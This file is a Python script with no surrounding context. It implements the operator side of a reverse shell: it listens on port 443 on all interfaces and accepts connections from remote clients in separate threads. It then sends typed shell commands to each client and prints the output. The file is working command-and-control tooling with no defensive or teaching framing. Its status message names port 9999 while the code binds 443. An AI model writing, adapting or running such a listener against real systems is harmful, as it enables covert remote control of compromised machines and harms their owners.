import socket
import threading

def handle_client(client_socket):
    print("Handling client")
    while True:
        try:
            cwd = client_socket.recv(1024).decode('utf-8')
            prompt = f"{cwd}> "
            command = input(prompt)
            if not command.strip():
                continue

            client_socket.send(command.encode('utf-8'))

            if command.lower() == 'exit':
                print("Closing connection...")
                break

            # Handle large responses
            output = ""
            while True:
                data = client_socket.recv(4096).decode('utf-8')
                output += data
                if len(data) < 4096:
                    break
            print(output)
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    
    client_socket.close()
    print("Client connection closed")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 443))  # Listen on all available interfaces
    server.listen(5)
    print("Listening on port 9999")
    
    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    main()
